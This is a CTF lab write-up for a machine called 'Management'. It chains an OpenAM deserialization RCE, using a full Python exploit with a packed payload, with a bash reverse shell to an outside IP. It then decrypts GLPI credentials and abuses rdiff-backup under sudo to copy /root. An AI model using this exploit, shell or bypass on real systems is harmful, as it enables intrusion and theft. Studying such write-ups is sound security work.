---
layout: post
title: Management - CTF
date: 2026-09-18
pid: "0398"
category: "CTFs"
htb: true
difficulty: "EASY"
description: "Chaining an OpenAM Java deserialization RCE and decrypted GLPI database credentials for initial access, followed by abusing an rdiff-backup sudo misconfiguration for root access."
tags: [HTB, Linux, Python, OpenAM]
unlock_date: 2027-01-30 12:00:00 -0700
---
### 1. Overview
This machine involved exploiting a vulnerable instance of OpenAM. Initial access was gained by leveraging a pre-authentication remote code execution vulnerability (`CVE-2026-33439`) stemming from unsafe Java deserialization. After securing a shell as the `openam` user, internal enumeration revealed hardcoded database credentials for a GLPI installation. Accessing the database provided an encrypted LDAP password, which was decrypted using a locally stored encryption key to obtain SSH credentials for the user `owen`. Privilege escalation was achieved by abusing a `sudo` misconfiguration in `rdiff-backup`, where the `--remote-schema` argument was used to bypass path restrictions and copy the contents of the root directory.
### 2. Recon
Starting this machine, I ran the standard Nmap service and port scan:
```
╰─> nmap -sCV 10.129.3.182 -oN management.nmap
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-16 11:32 -0700
Nmap scan report for 10.129.3.182
Host is up (0.073s latency).
Not shown: 995 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     nginx 1.24.0 (Ubuntu)
443/tcp   open  ssl/http nginx 1.24.0 (Ubuntu)
4444/tcp  open  ssl/ldap
50389/tcp open  ldap     (Anonymous bind OK)
```

The scan found 5 ports:
- **22 SSH**
- **80 HTTP**
- **443 HTTPS**
- **4444 SSL/LDAP**
- **50389 LDAP**

The scan also found the domain `management.htb` so I added that to my hosts file. Going to the webpage hosted on port 443 showed a standard business page with a "Client Login" button in the top right. Clicking on the login button redirects to a subdomain called `sso.management.htb`.

Adding this subdomain to my hosts file and browsing to it greeted me with an `OpenAM` admin login page. To get the version of OpenAM, I queried the `https://sso.management.htb/openam/SMSServlet?method=version` endpoint:
```
╰─> curl -k https://sso.management.htb/openam/SMSServlet?method=version   
OpenAM 16.0.5 Build a901278f65 (2026-February-04 16:06)
```
### 3. Foothold
OpenAM version 16.0.5 is vulnerable to CVE-2026-33439, a pre-auth RCE exploit. This exploit exists due to unsafe Java deserialization in the `jato.clientSession` HTTP parameter. It allows for unauthenticated attackers to execute arbitrary code by bypassing the `WhitelistObjectInputStream` mitigation that was applied for the earlier CVE-2021-35464 exploit.

To exploit this, I first needed to find an entry point. While looking through the source code of the `/openam/ui/PWResetUserValidation`, I found a hidden input that seemed like an entry point:
```
<input type="hidden" name="jato.pageSession" value="rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAFb3JnRE50ABRkYz1tYW5hZ2VtZW50LGRjPWh0Yng=">
```

With an entry point found, I wrote the following script to test the exploit. Since the `jato.pageSession` parameter did not work, I tried something a little different and used `jato.clientSession`:
```
#!/usr/bin/env python3
import requests
import sys
import zlib
import base64
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOAD = (
    'c-oy;TW}j!8UEI~>`GqW>o{si)0CFTxo8VX6Jn=Ld?iZc*ojP1OMtsx9ZQ?6c9q>DTQ1Pj0-b@r@&YsEiJ3kS9>R2-'
    '4y6noW`N;=8Q?9v@X7;EyfECte|A^a`Vzp^XjXg9`LEx9JG%E5Bs>=*xAiqW*W{*^TX0RsHTlN%CTp_qJbeDWe_VX?ehgiC#69y>'
    'RzTWt>J8o1x#MyiC<snXaB5Rq`{S(!fG!d|<G9tF(_pq)VKyhR4NK>%j$8LP^?J^*Oyf?@aBS{6R&L6%nsxix;HM)G!AI&6X7uQu'
    '!R(4@SBqpp0ZGHB<~Um*W!hfKv_P5WE7L+{TA(Gc6=ds~k7H}cw4o9dy~!QRwC|LVW}cxp*kxX~@<`S7R)N`7UL*K)&Ruh*$(hH|'
    '7lCh1Z;Wq4_by(8R6wetbA8IvJ)$2B=q=r@YDE%bR|Sh8DDn-'
    '9d4fe2EX;7i2%X<2D${LNlAIJ|Iu}xv0=jEVuQ1m)CEQYjt!>IfvPF|yEF|lxGtbkjY}OaYkqO-'
    '3ti`pt=n?6RlSyqp#ic+qH(%ixig-ThI2O}wB33+dQC|rZbr+EE7aT9_)9FRQM)G>NuzJBIBA0K3RwUNV3a|MK$`wh3yRr4*=y#g'
    'D(c~eM$-G8`lIisRlF2uqlS?Cc^seZ(&D;gYGr8&5C8TQ38gp+r>s|>XcGI%V)eTw|Opnjo)09oFvyn%-'
    'L112M)>jBNC}L5hs?B4FUQJuXb%Jx<sMX1;QU_q7b)EGorzv*RUd>sb^wpO-5SNe?udGr+U+^-'
    '~F2n+4N_Jsp2w6I)NnslS6iITiGcL&e^R1K#VJJ}PaE$FUcoT-uEO^JGqC7uu`zc99eNcGTNE{W!NngC)AP`t6Nf0zb0&O}%Eoz{'
    '~%xbM&1F0<-'
    '_iyJ7AL}sFWH$(1+r|LVpr`DScP?JsUqVf+P(tVip9<EU)Jhf5tA~hroY?}B|F?5aY~vf>*38<iXNA@DH5ws1x?7QnxcmKL#$qD-'
    'ywG*U+Oi|s-'
    'sV?sGehw7w$JAnuQ`<voM@X!Qo|&HVl_f5uhWfMokA4@DJb4H7F#c(UWYmpaKd%<4dG<#jo%;s?yvNBVvxe=7tD(FxOldRYoNn*S'
    '@&wx!V~htkA89BmEY0CoJHDl^vW!u?NBkMc+F*0SyrXhxOgd0y{^!s-<Q_0)E6Hk>7yd#L89hbI-'
    '!zlc@{Tv6xdd7k<~?zn3t#D)UElC?0Y{v9fM2*a@n*+7~5T-'
    'cbOP$kNRSs_FGgV%X+irw{bCpjz{akSEKoAG?$uzS!bH?%<ll>Wu%u^HaJa)ir|cu%adg!myK{Zl_TNv#Z&YW%aK40Ebr`<+iwt^'
    '{ctM#y|(H4ny&sUGhD6y@m!YxON5Q~yULUI{yOrvq_X&@a67g3n}7f0XLNi9-'
    '%L})V>03@5=ctW{)eCKl35JVl90S$+9rQVLM%IaQ-LDk2#x2QNx<8T=WbIU$lYLfo8-'
    'rwZd0#y(@3LRhN_|my%PF%03t!As=7vqNO&&0dzg>zLQp}!gn=sKp&n7sG&Y5vK@~%ILPCm8gW8aAX%C^h!xB~FvQ>);O$#K9%Qz'
    'sRe`gt{aS$09PpUYCPe?fUICg@}wAY+F<lg!0?qV+Q-WuJ#mBuihQgH-NOHjzS5V@i3Ug$g{A>Bbo!Lt&&{k7L{Y>z4UQ~=Or|57'
    '3&yUn`*AqB@N#74c6#xa~!aSAyKl<CdX8+^kLeo4Xew56?>w&v9od`3doDMQAYZCFtH8g!ePY?@X@q{3;O6{&Yl!hvjgk6_;vB<E'
    'F(VVvA^S;ch8{~6bH=tku-y)NN!wiNYxyM}SW|DuYQa8aUbJl9>y+2QOS3`9ABNf}crrZFQ0eQO(qgx;!X5LBIQ-'
    '6L&DrlUm;C`CR;hP6*7sUP?qbKWoQfF_Mu#L~Eet1=2I=5S34I_wTv65{kjX_Ls7Cr9&wZ9&C#+@PIx`WHfZB-'
    '2SgFR;3TMHQbHm7Fjv$76!}mWr3LL^0>imLViGJ6fJpP$s857L<(57dIM|4qv2v@$a2f!=|lZnbL!3id^SSF9jVdG7J?Jux%*iNd'
    '%QQiC$b<5CHB<#We9&Rn%aT&1<^VWb>;c@cC#sLNS!Lcc?iK;8D;NT$f=>qNyopke91gQzRQ{?e<?Mo2#oLhj|-'
    'JU*=59VE)}p#+n3mX3exZ9V|XYt(sKP?I^qz`ZrB-+Mfwx#7kJnK5hg|&(BfOMi1+j<}ugQEt-ZdP4(ba7y2*jcEuv+MsE_vTUL2'
    '8zA7R67zJ%hx5y=U|J9nE##DG+n_iroXqjG~v+$40$1qsAKv$fg+4oQ~7<Xuv`%uYvli=Q?e96h8({v3sYYIRIqQK__HIAZ56G(j'
    'GbladAM9+0v9j0G#`$!yr0O`Je6=~5k>2HeX23{pbL7EX)0YR~o>}h;Cl=~H*;k5`ud@qKh5e5aXw~gt#KyN)n`u3pwK2leY5B9}'
    'AM0yhg68#Qu(v9lGCJqlC4R=q3yL0~TCwJ^#J1KUbi_`8>Z17l-j!x2Im=>e782LGljm0zZUrL8E@lBlgo-'
    '~yF5Xb0LD=x(cKV4i(Wa7oK#0NONlu10m3q<tUO<WjDW|Et@G$wz5*`)`#Jf;lv<EP44DkEo7o5(MnO@AN#86}g74U;+Z?>_o-'
    'M&3j*qio{lSobMmR4HoIsnDn|2%~QK=U)oWe~ecm1Oxc>`&jJ|-46Xd75Y1-'
    'W>m3ng~IECH=_p3nQoskpm0LYj2f~A0`Kk+c<Wunuih5{lirfP1&^XCLRi89dZs8;X^L<+G^m)Nu$kz^8v5`yT_WGX0Dgc${D^J^'
    '@8Jpjmd5BGi0>gr@OK=PjvynQ#go#@I3zV_iob=Yq;J!d{TfL=hr}adO3UIq-'
    '2NVu@rH~E8CPV?%BTbXBpHwJK%_KH6HjE=*Zqt2H|URWVqx88mBu<{ow)Bk)A|o^yj8{'
)

def exploit(target_url, command):
    raw = zlib.decompress(base64.b85decode(PAYLOAD))
    payload = base64.urlsafe_b64encode(raw).rstrip(b'=').decode('ascii')

    params = {
        'jato.clientSession': payload
    }

    headers = {
        'cmd':command,
        'Connection':'close',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0'
    }

    req = requests.get(target_url, headers=headers, params=params, verify=False)
    print(req.text)

def main():
    target_url = sys.argv[1]
    command = sys.argv[2]

    exploit(target_url, command)

if __name__ == '__main__':
    main()
```

Running the script against that endpoint returned the user running the webservice:
```
╰─> python3 exploit.py https://sso.management.htb/openam/ui/PWResetUserValidation 'id'
uid=996(openam) gid=987(openam) groups=987(openam)
```

Using the script, I got a rev shell:
```
╰─> python3 exploit.py https://sso.management.htb/openam/ui/PWResetUserValidation 'bash -c "bash -i >& /dev/tcp/10.10.14.125/9001 0>&1"'
```

Now that I had a revshell, I could start looking for a better pivot point. While looking around the `/opt` directory, I found a `/opt/glpi` folder. 

GLPI is an IT management tool, so that looked like my best bet. Going into the config folder located at `/opt/glpi/config`, I found a `config_db.php` file containing hardcoded credentials for an SQL server:
```
openam@management:/opt/glpi/config$ cat config_db.php 
<?php
class DB extends DBmysql {
   public $dbhost = '127.0.0.1';
   public $dbuser = 'glpi';
   public $dbpassword = '8rhu0L6Pw4Y7';
   public $dbdefault = 'glpidb';
   public $use_utf8mb4 = true;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}
```

Using these credentials, I signed into the SQL database. Remembering from earlier that there was an open port for an LDAP service, I targetted information regarding that.

The SQL database contained a table named `glpi_authldaps`. Looking into that table revealed an encrypted password:
```
MariaDB [glpidb]> select id,name,host,rootdn_passwd from glpi_authldaps;
+----+----------------------+--------------------+--------------------------------------------------------------------------+
| id | name                 | host               | rootdn_passwd                                                            |
+----+----------------------+--------------------+--------------------------------------------------------------------------+
|  1 | Management Directory | sso.management.htb | avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw== |
+----+----------------------+--------------------+--------------------------------------------------------------------------+
```

Since GLPI stores the more sensitive passwords using a special encryption (sodium XChaCha20-Poly1305), I needed to find the key to crack it. Looking back into the `/opt/glpi/config` directory, I found the key needed to start the bruteforce:
```
openam@management:/opt/glpi/config$ ls
config_db.php  glpicrypt.key  oauth.pem  oauth.pub
```

Now that I had the encryption key and the password, I wrote a simple python script to decrypt the password:
```
import base64
import nacl.bindings

with open("glpicrypt.key", "rb") as f:
    key = f.read().strip()

encrypted = "avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw=="
data = base64.b64decode(encrypted)

nonce = data[:24]
cipher_text = data[24:]

pt = nacl.bindings.crypto_aead_xchacha20poly1305_ietf_decrypt(cipher_text, aad=nonce, nonce=nonce, key=key)
print(pt.decode())
```

Running the script returns the password `WpczC40GhTbk`. I then used that password and signed into SSH as the user `owen`:
```
╰─> ssh owen@management.htb
owen@management.htb's password: 
owen@management:~$
```
### 4. Root
Now that I had SSH access, I could start looking for a priv-esc vector. The first thing I checked was `sudo -l`, which returned that the user `owen` could run `/usr/bin/rdiff-backup` as root without a password:
```
owen@management:~$ sudo -l
User owen may run the following commands on management:
    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only
        *
```

Looking into the arguments that the command allows, I found an interesting `remote-schema` argument:
```
owen@management:~$ /usr/bin/rdiff-backup --help     
options:
  -h, --help            show this help message and exit
  --api-version API_VERSION
                        [opt] integer to set the API version forcefully used
  --current-time CURRENT_TIME
                        [opt] fake the current time in seconds (for testing)
  --force               [opt] force action (caution, the result might be dangerous)
  --fsync, --no-fsync   [opt] do (or not) often sync the file system (_not_ doing it is faster but can
                        be dangerous)
  --null-separator      [opt] use null instead of newline in input and output files
  --new, --no-new       [opt] enforce (or not) the usage of the new parameters
  --chars-to-quote CHARS, --override-chars-to-quote CHARS
                        [opt] string of characters to quote for safe storing
  --parsable-output     [opt] output in computer parsable format
  --remote-schema REMOTE_SCHEMA
                        [opt] alternative command to call remotely rdiff-backup
  --remote-tempdir DIR_PATH
                        [opt] use path as temporary directory on the remote side
  --ssh-compression, --no-ssh-compression
                        [opt] use SSH without compression with default remote-schema
  --tempdir DIR_PATH    [opt] use given path as temporary directory
  --terminal-verbosity {0,1,2,3,4,5,6,7,8,9}
                        [opt] verbosity on the terminal, default given by --verbosity
  --use-compatible-timestamps
                        [opt] use hyphen '-' instead of colon ':' to represent time
  -v {0,1,2,3,4,5,6,7,8,9}, --verbosity {0,1,2,3,4,5,6,7,8,9}
                        [opt] overall verbosity on terminal and in logfiles (default is 3)
  -V, --version         [opt] output the rdiff-backup version and exit
```

This argument allows an atlternative command to be called, so the next thing I tried was using that argument to bypass the `--restrict-path` restriction from the `sudo -l` output.

After trying a couple of different times, I couldnt get a reliable output. So instead of wasting time with manual commands, I wrote the following script to do it easily:
```
owen@management:/tmp$ cat rdiff.sh 
#!/bin/bash
mkdir -p /tmp/rootbak
rdiff-backup --remote-schema '%s' \
  'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path /root --restrict-mode read-only'::/root \
  /tmp/rootbak
```

With the script written, I made another target directory for the output:
```
owen@management:/tmp$ mkdir /tmp/rootbak
```

Then, I ran the script:
```
owen@management:/tmp$ bash rdiff.sh 
WARNING: this command line interface is deprecated and will disappear, start using the new one as described with '--new --help'.
WARNING: this command line interface is deprecated and will disappear, start using the new one as described with '--new --help'.
WARNING: Server will be called with deprecated command line interface to guarantee compatibility. It might lead to a deprecation warning from newer rdiff-backup versions. Use '--api-version 201' (or higher) to avoid it.
NOTE: Starting mirror from source path /root to destination path /tmp/rootbak
```

The script successfully pulled the root directory and made a copy to `/tmp/rootbak`:
```
owen@management:/tmp$ ls rootbak/
rdiff-backup-data  root.txt
```
### 5. Conclusion
Initial access was obtained by discovering an OpenAM administration portal and exploiting `CVE-2026-33439`, a pre-authentication remote code execution vulnerability caused by unsafe Java deserialization. Once a reverse shell was established as the `openam` user, hardcoded SQL credentials were recovered from a GLPI configuration file. These credentials allowed access to a database containing an encrypted LDAP password, which was successfully decrypted using a local key to gain SSH access as the `owen` user.

Privilege escalation was achieved by identifying a `sudo` configuration that allowed the `owen` user to run `rdiff-backup` as root with restricted paths. By abusing the `--remote-schema` argument, the path restrictions were bypassed, allowing the entire root directory to be copied to a readable location, effectively granting root-level access to the machine.